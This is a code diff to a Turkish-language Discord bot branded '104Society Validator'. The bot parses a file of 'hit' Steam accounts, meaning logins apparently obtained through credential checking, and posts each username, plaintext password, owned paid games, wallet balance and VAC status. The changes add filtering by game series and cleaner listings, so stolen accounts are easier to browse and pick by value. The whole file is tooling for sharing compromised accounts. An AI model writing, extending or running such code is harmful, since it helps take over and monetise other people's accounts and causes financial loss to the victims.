@@ -109,15 +109,55 @@ def read_recent_hits(n: int = 6) -> List[str]:
         pass
     return []
 
-def search_series_hits(series_key: str, max_results: int = 8) -> List[str]:
+def search_series_hits(series_key: str, max_results: int = 8) -> List[dict]:
     patterns = GAME_SERIES.get(series_key.lower(), [series_key.lower()])
     matches = []
     try:
         if HITSDC_FILE.exists():
             for line in HITSDC_FILE.open("r", encoding="utf-8", errors="ignore"):
-                low = line.lower()
-                if any(p in low for p in patterns):
-                    matches.append(line.strip())
+                line = line.strip()
+                if not line:
+                    continue
+                parts = [p.strip() for p in line.split("|")]
+                acct = parts[0] if parts else ""
+                user, pwd = acct.split(":", 1) if ":" in acct else (acct, "")
+                
+                # Extract games list from PaidGames
+                games_part = next((p for p in parts if "PaidGames" in p), "")
+                if not games_part or ":[" not in games_part:
+                    continue
+                
+                raw_games = games_part.split(":[", 1)[1].rsplit("]", 1)[0].strip()
+                game_list = [g.strip() for g in raw_games.split(" | ") if g.strip()]
+                
+                # Check if this account actually owns the target series
+                matched_games = []
+                for g in game_list:
+                    gl = g.lower()
+                    if any(p in gl for p in patterns):
+                        matched_games.append(g)
+                
+                if matched_games:
+                    # Clean up game list: filter out trash/none/digits
+                    clean_games = [
+                        g for g in game_list 
+                        if g.lower() != "none" 
+                        and not g.isdigit() 
+                        and not g.startswith("AppID ") 
+                        and "(paid: " not in g.lower()
+                    ]
+                    
+                    wallet = next((p.replace("Wallet:", "").strip() for p in parts if "Wallet:" in p), "")
+                    vac = next((p.replace("VAC:", "").strip() for p in parts if "VAC:" in p), "CLEAN")
+                    
+                    matches.append({
+                        "user": user,
+                        "pass": pwd,
+                        "matched_games": matched_games,
+                        "all_games": clean_games,
+                        "wallet": wallet,
+                        "vac": vac
+                    })
                     if len(matches) >= max_results:
                         break
     except Exception:
@@ -226,28 +266,59 @@ async def cmd_cloud(ctx: commands.Context):
     await ctx.send(embed=embed)
 
 
-@bot.hybrid_command(name="recenthits", description="Son bulunan hit hesapları gösterir")
+@bot.hybrid_command(name="recenthits", description="Son bulunan hit hesapları ve oyunlarını gösterir")
 @app_commands.describe(count="Kaç hesap gösterilsin? (1-10)")
 async def cmd_recenthits(ctx: commands.Context, count: int = 5):
     count = min(max(1, count), 10)
-    hits = read_recent_hits(count)
+    hits = read_recent_hits(count * 3)  # Read more to allow filtering trash
     if not hits:
         await ctx.send("❌ Henüz kaydedilmiş bir hit bulunamadı.")
         return
 
+    # Filter out any lingering None or 0 entries
+    valid_entries = []
+    for line in reversed(hits):
+        parts = [p.strip() for p in line.split("|")]
+        acct = parts[0] if parts else ""
+        games_part = next((p for p in parts if "PaidGames" in p), "")
+        if ":[" in games_part:
+            raw = games_part.split(":[", 1)[1].rsplit("]", 1)[0].strip()
+            games = [g.strip() for g in raw.split(" | ") if g.strip() and g.lower() != "none" and not g.isdigit() and not g.startswith("AppID ")]
+            if games:
+                valid_entries.append((line, parts, acct, games))
+                if len(valid_entries) >= count:
+                    break
+
+    if not valid_entries:
+        await ctx.send("❌ Henüz geçerli oyunlu hit bulunamadı.")
+        return
+
     embed = discord.Embed(
-        title=f"🔥 Son {len(hits)} Hit Hesap",
+        title=f"🔥 Son {len(valid_entries)} Hit Hesap (Oyunlarıyla Birlikte)",
         color=COLOR_ORANGE,
         timestamp=datetime.now(timezone.utc)
     )
-    for i, line in enumerate(reversed(hits), 1):
-        parts = [p.strip() for p in line.split("|")]
-        acct = parts[0] if parts else "?"
+    for i, (_, parts, acct, games) in enumerate(valid_entries, 1):
         user, pwd = acct.split(":", 1) if ":" in acct else (acct, "")
-        games_part = next((p for p in parts if "PaidGames" in p), "—")
+        wallet = next((p.replace("Wallet:", "").strip() for p in parts if "Wallet:" in p), "")
+        vac = next((p.replace("VAC:", "").strip() for p in parts if "VAC:" in p), "CLEAN")
+        
+        shown_games = ", ".join(games[:6])
+        if len(games) > 6:
+            shown_games += f" +{len(games) - 6} oyun daha"
+            
+        desc = [
+            f"👤 `{user}` : ||`{pwd}`||",
+            f"🎮 **Oyunlar ({len(games)}):** {shown_games}"
+        ]
+        if wallet and wallet != "0.00 TL":
+            desc.append(f"💰 **Bakiye:** `{wallet}`")
+        if vac == "BANNED":
+            desc.append("⚠️ **VAC: BANLI**")
+
         embed.add_field(
             name=f"#{i} — {user}",
-            value=f"`{user}` : ||`{pwd}`||\n{games_part[:180]}",
+            value="\n".join(desc),
             inline=False
         )
     embed.set_footer(text="104Society Validator", icon_url=STEAM_ICON)
@@ -277,14 +348,32 @@ async def cmd_search(ctx: commands.Context, series: str):
         color=color,
         timestamp=datetime.now(timezone.utc)
     )
-    for i, line in enumerate(matches, 1):
-        parts = [p.strip() for p in line.split("|")]
-        acct = parts[0] if parts else "?"
-        user, pwd = acct.split(":", 1) if ":" in acct else (acct, "")
-        games_part = next((p for p in parts if "PaidGames" in p), "—")
+    for i, m in enumerate(matches, 1):
+        user = m["user"]
+        pwd = m["pass"]
+        matched_str = ", ".join(f"**{g}**" for g in m["matched_games"][:4])
+        all_games = m["all_games"]
+        
+        # Display other games neatly
+        other_games = [g for g in all_games if g not in m["matched_games"]]
+        other_str = ", ".join(other_games[:6])
+        if len(other_games) > 6:
+            other_str += f" +{len(other_games) - 6} oyun daha"
+        
+        desc_lines = [
+            f"👤 `{user}` : ||`{pwd}`||",
+            f"🎯 **Aranan Seri:** {matched_str}",
+        ]
+        if other_str:
+            desc_lines.append(f"🎮 **Diğer Oyunlar:** {other_str}")
+        if m.get("wallet") and m["wallet"] != "0.00 TL":
+            desc_lines.append(f"💰 **Bakiye:** `{m['wallet']}`")
+        if m.get("vac") == "BANNED":
+            desc_lines.append("⚠️ **VAC: BANLI**")
+
         embed.add_field(
-            name=f"#{i} — {user}",
-            value=f"`{user}` : ||`{pwd}`||\n{games_part[:180]}",
+            name=f"#{i} — {user} ({len(all_games)} Ücretli Oyun)",
+            value="\n".join(desc_lines),
             inline=False
         )
     embed.set_footer(text="104Society Validator", icon_url=STEAM_ICON)
